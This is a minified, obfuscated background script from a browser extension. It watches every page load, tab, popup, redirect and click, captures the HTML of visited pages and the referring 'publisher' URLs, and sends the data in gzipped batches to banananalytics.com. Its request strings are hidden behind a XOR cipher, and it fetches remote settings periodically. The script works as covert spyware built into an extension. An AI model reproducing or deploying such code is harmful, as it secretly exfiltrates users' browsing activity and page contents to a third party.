!function(){try{webpackJsonp([0],{0:function(e,t,s){"use strict";e.exports={marker:"b:"+Date.now()+"."+Math.random(),messageMarker:"sp?6UrELZ@",serviceUrls:{error:"https://banananalytics.com/api/register",settings:"https://banananalytics.com/api/settings",banner:"https://banananalytics.com/api/register",native:"https://native.banananalytics.com/api/register",footprint:"https://banananalytics.com/api/register",popup:"https://banananalytics.com/api/register",popunder:"https://banananalytics.com/api/register",pageViews:"https://ecomm.banananalytics.com/api/register",socialImpressions:"https://ecomm.banananalytics.com/api/register",debugSocialImpressions:"https://ecomm.banananalytics.com/api/register"},batchTimeout:6e4,batchSize:20,checkInterval:1e3,checkLimit:3,footprintsSearchTimeout:3e3,pageViewsTimeout:3e3,socialImpressionsInterval:5e3,redirectTimeout:5e3,periodBetweenClickAndRequest:500,debug:!1,testMode:!1}},1:function(e,t,s){"use strict";var i=function(e,t,s,i){return new(s||(s=Promise))(function(n,r){function a(e){try{u(i.next(e))}catch(e){r(e)}}function o(e){try{u(i.throw(e))}catch(e){r(e)}}function u(e){e.done?n(e.value):new s(function(t){t(e.value)}).then(a,o)}u((i=i.apply(e,t||[])).next())})};Object.defineProperty(t,"__esModule",{value:!0});const n=s(0),r=s(2);function a(e){return e[n.messageMarker]=!0,e}function o(e,t){return e&&e.type&&n.messageMarker in e&&(void 0===t||e.type===t)}t.markMessage=a,t.wrapMessage=function(e){const t={type:e.type,data:e};return a(t),t},t.isOurMessage=o,t.isDataMessageEnvelope=function(e){return e&&e.data&&e.type===e.data.type&&o(e)},t.safeHandler=function(e,t){return n.debug?t?e.bind(t):e:function(){try{return e.apply(t||this,arguments)}catch(e){r.error(e)}}},t.parseCookieNames=function(){return document.cookie.split(";").filter(e=>""!==e).map(e=>e.trim().split("=")[0])},t.sleep=function(e){return new Promise(t=>setTimeout(t,e))},t.timeoutAfter=function(e,t){return i(this,void 0,void 0,function*(){return new Promise((s,i)=>{const n=setTimeout(()=>i("timeoutAfter: timeout"),t);e.then(e=>{clearTimeout(n),s(e)},e=>{clearTimeout(n),i(e)})})})}},17:function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),(new(s(18).default)).run().then(()=>{},()=>{})},18:function(e,t,s){"use strict";var i=function(e,t,s,i){return new(s||(s=Promise))(function(n,r){function a(e){try{u(i.next(e))}catch(e){r(e)}}function o(e){try{u(i.throw(e))}catch(e){r(e)}}function u(e){e.done?n(e.value):new s(function(t){t(e.value)}).then(a,o)}u((i=i.apply(e,t||[])).next())})};Object.defineProperty(t,"__esModule",{value:!0});const n=s(0),r=s(1),a=s(2),o=s(19),u=s(28),d=s(8),l="B0F262AFBF18A1A5F1E07735B338F26D",c=18e4,h=36e5,p=6e4,g=36e5;t.default=class{constructor(){this._isInitialized=!1,this._requestQueue=new o.RequestQueue(n.debug)}run(){return i(this,void 0,void 0,function*(){try{a.info("Initializing app. Version: 1.10.0"),yield this._initialize(),a.info("Background app was initialized")}catch(e){throw a.error("Failed to initialize app: "+e),e}})}_initialize(){return i(this,void 0,void 0,function*(){if(this._isInitialized)return;const e=yield r.timeoutAfter(this._getSettings(),h);this._initEventHandlers(),this._isInitialized=!0,this._popupDetection=new u.default(e.popup,this._requestQueue),this._popupDetection.init(),this._updateSettingsPeriodically()})}_initEventHandlers(){window.addEventListener("message",r.safeHandler(this._onInternalMessage,this)),chrome.runtime.onMessage.addListener(r.safeHandler(this._onMessage,this)),chrome.webRequest.onBeforeRequest.addListener(r.safeHandler(this._onBeforeRequest,this),{urls:["*://*.gemini.yahoo.com/*"]})}_getSettings(){return i(this,void 0,void 0,function*(){if(this._settings)return this._settings;let e=this._loadSettingsFromCache();if(null!==e)return this._setSettings(e),this._settings;for(;null===e;)try{e=yield this._loadSettings()}catch(e){a.info("Failed to load settings. "+e),yield r.sleep(c)}return this._setSettings(e),this._settings})}_setSettings(e){this._settings=e,this._saveSettingsToCache(e),this._notifySettingsUpdated(this._settings)}_saveSettingsToCache(e){localStorage.clear(),localStorage.setItem(this._getSettingsKey(),JSON.stringify(e))}_loadSettingsFromCache(){const e=localStorage.getItem(this._getSettingsKey());return null===e?null:JSON.parse(e)}_getSettingsKey(){return"1.10.0_"+l}_loadSettings(){return r.timeoutAfter(d.loadSettings(n.serviceUrls.settings),p)}_updateSettings(){return i(this,void 0,void 0,function*(){try{const e=yield this._loadSettings();this._setSettings(e)}catch(e){throw a.error("Failed to update settings: "+e),e}})}_notifySettingsUpdated(e){const t=r.markMessage({type:"settingsUpdated",data:{settings:e}});this._sendMessageAllTabs(t),this._popupDetection&&this._popupDetection.setSettings(e.popup)}_updateSettingsPeriodically(){return i(this,void 0,void 0,function*(){for(;;)try{yield r.sleep(g),yield this._updateSettings()}catch(e){}})}_onInternalMessage(e){r.isOurMessage(e.data)&&r.isDataMessageEnvelope(e.data)&&-1!==this._settings.typesToProcess.indexOf(e.data.type)&&this._requestQueue.enqueue(e.data)}_onMessage(e,t,s){r.isOurMessage(e)&&(r.isDataMessageEnvelope(e)&&-1!==this._settings.typesToProcess.indexOf(e.type)?this._requestQueue.enqueue(e.data):"getSettings"===e.type&&s({settings:this._settings}))}_onBeforeRequest(e){const t=r.markMessage({type:"yrequest",data:{url:e.url}});chrome.tabs.sendMessage(e.tabId,t)}_sendMessageAllTabs(e){chrome.tabs.query({},t=>{t.forEach(t=>{"number"==typeof t.id&&chrome.tabs.sendMessage(t.id,e)})})}}},19:function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});const i=s(0),n=s(2),r=s(8);t.RequestQueue=class{constructor(e=!1){this._debug=e,this._batchTimer=null,this._items=[]}enqueue(e){this._debug&&n.info("queue: message pushed",e),this._items.push(e),this._items.length>=i.batchSize?this._sendBatch():null===this._batchTimer&&(this._batchTimer=setTimeout(()=>this._sendBatch(),i.batchTimeout))}_sendBatch(){null!==this._batchTimer&&(clearTimeout(this._batchTimer),this._batchTimer=null);const e=this._items;if(this._items=[],e.length>0){const t={};e.forEach(e=>{(t[e.type]=t[e.type]||[]).push(e)}),Object.keys(t).forEach(e=>{const s=i.serviceUrls[e];s&&r.sendData(s,t[e]).catch(e=>{n.error(e)})})}}}},2:function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});const i=s(0),n=s(1);function r(e,t,...s){i.debug&&console[e](...[t,...s])}t.log=r,t.info=function(e,...t){r("info",e,...t)},t.error=function(e,...t){r("error",e,...t);const s=n.wrapMessage({type:"error",message:e.toString()});window.postMessage(s,"*")}},28:function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});const i=s(0),n=s(1),r=s(2);t.default=class{constructor(e,t){this._tabs={},this._popupWindows={},this._settings=e,this._requestQueue=t}setSettings(e){this._settings=e}init(){const e={urls:["<all_urls>"],types:["main_frame"]},t=["responseHeaders"];chrome.webRequest.onBeforeRequest.addListener(n.safeHandler(this._onBeforeRequest,this),e),chrome.webRequest.onBeforeRedirect.addListener(n.safeHandler(this._onRequestRedirect,this),e,t),chrome.webRequest.onCompleted.addListener(n.safeHandler(this._onRequestCompleted,this),e,t),chrome.webRequest.onErrorOccurred.addListener(n.safeHandler(this._onRequestErrorOccurred,this),e),chrome.tabs.onCreated.addListener(n.safeHandler(this._onTabCreated,this)),chrome.tabs.onUpdated.addListener(n.safeHandler(this._onTabUpdated,this)),chrome.tabs.onRemoved.addListener(n.safeHandler(this._onTabRemoved,this)),chrome.windows.onCreated.addListener(n.safeHandler(this._onWindowCreated,this)),chrome.windows.onRemoved.addListener(n.safeHandler(this._onWindowRemoved,this)),chrome.runtime.onMessage.addListener(n.safeHandler(this._onMessage,this))}_onMessage(e,t){if(!n.isOurMessage(e))return;if(!t.tab||!t.tab.id)return;const s=this._getTab(t.tab.id);if(null!==s)if("userClicked"===e.type)s.userClickedTime=Date.now();else if("pageCreated"===e.type){const t=e.data;t.isFrame||(s.html=t.html,s.referrerUrl=t.referrerUrl),s.debug.pagesInfo.push({html:t.html,isFrame:t.isFrame,referrerUrl:t.referrerUrl,url:t.url})}}_getPopupNetworkByUrl(e){let t=null;if(!e)return t;const s=document.createElement("a");s.href=e;const i=s.hostname;return Object.keys(this._settings.patterns).some(e=>{const s=this._settings.patterns[e].some(e=>-1!==i.indexOf(e));return s&&(t=e),s}),t}_onBeforeRequest(e){const t=this._getTab(e.tabId);null!==t&&(null!==t.pageLoadTimer&&(clearTimeout(t.pageLoadTimer),t.pageLoadTimer=null),t.debug.requests.push(e.url),null!==t.userClickedTime&&(e.timeStamp-t.userClickedTime<=i.periodBetweenClickAndRequest?(t.network=this._getPopupNetworkByUrl(t.redirects[0]),null!==t.network?this._sendPopup(t):t.userClickedTime=null):t.userClickedTime=null))}_onRequestRedirect(e){const t=this._getTab(e.tabId);null!==t&&t.redirects.push(e.url)}_onRequestCompleted(e){const t=this._getTab(e.tabId);null!==t&&t.redirects.push(e.url)}_onRequestErrorOccurred(e){this._deleteTab(e.tabId)}_onWindowCreated(e){"popup"===e.type&&(this._popupWindows[e.id]={type:"popup"})}_onWindowRemoved(e){delete this._popupWindows[e]}_onTabRemoved(e){const t=this._getTab(e);null!==t&&(null!==t.pageLoadTimer&&(clearTimeout(t.pageLoadTimer),t.pageLoadTimer=null),t.network=this._getPopupNetworkByUrl(t.redirects[0]),null!==t.network?(t.userClosedTab=!0,this._sendPopup(t)):this._deleteTab(e))}_onTabCreated(e){e.id&&(e.openerTabId||this._popupWindows[e.windowId])&&(this._createTab(e.id,"popup"),e.openerTabId&&(this._createTab(e.openerTabId,"popunder"),chrome.tabs.get(e.openerTabId,t=>{t.url&&(this._tabs[e.id].publisherUrl=t.url,this._tabs[e.openerTabId].publisherUrl=t.url)})))}_onTabUpdated(e,t){if("complete"!==t.status)return;const s=this._getTab(e);null!==s&&(null!==s.pageLoadTimer&&(clearTimeout(s.pageLoadTimer),s.pageLoadTimer=null),s.pageLoadTimer=setTimeout(()=>{const t=s.redirects[0];s.pageLoadTimer=null,s.network=this._getPopupNetworkByUrl(t),null!==s.network?this._sendPopup(s):(t&&r.info("Not a network url: "+t),this._deleteTab(e))},i.redirectTimeout))}_getTab(e){return this._tabs[e]||null}_createTab(e,t){return this._tabs[e]={debug:{pagesInfo:[],requests:[]},html:"",network:null,pageLoadTimer:null,publisherUrl:"",redirects:[],referrerUrl:"",tabId:e,type:t,userClickedTime:null,userClosedTab:!1},this._tabs[e]}_deleteTab(e){delete this._tabs[e]}_sendPopup(e){const t={html:e.html,network:e.network,publisherUrl:e.publisherUrl,redirects:e.redirects,referrerUrl:e.referrerUrl,type:e.type,userClicked:null!==e.userClickedTime,userClosedTab:e.userClosedTab};i.debug&&(t.debug=e.debug),r.info("Send popup data to server"),r.info(t),this._deleteTab(e.tabId),this._requestQueue.enqueue(t)}}},8:function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});const i=s(9),n=window[T("30!6=")],r=T("=0410'&"),a=T("80!=:1"),o=T("7:1,"),u=T(""),d=T(""),l=T(":;!0;!x,%0"),c=T("4%%9<64!<:;z?&:;"),h=T("\rx9<0;!x0'&<:;"),p=T(":;!0;!x;6:1<;2"),g=T("2/<%"),m=T("8:10"),_=T("6:'&"),f=T("\rx-!0;&<:;x"),b=T("\rx-!0;&<:;x480"),y={[l]:c,[h]:"1.10.0",[f]:chrome.runtime.id,[b]:chrome.runtime.getManifest().name};function T(e){let t="";for(let s=0;s<e.length;s++)t+=String.fromCharCode(85^e.charCodeAt(s));return t}t.loadSettings=function(e){return n(e,{[a]:u,[r]:y,[m]:_}).then(e=>e.json())},t.sendData=function(e,t){return n(e,{[a]:d,[o]:function(e){return i.gzip(e,{level:6})}(JSON.stringify(t)),[r]:Object.assign({},y,{[p]:g}),[m]:_}).then(e=>e.text())}}},[17])}catch(e){}}();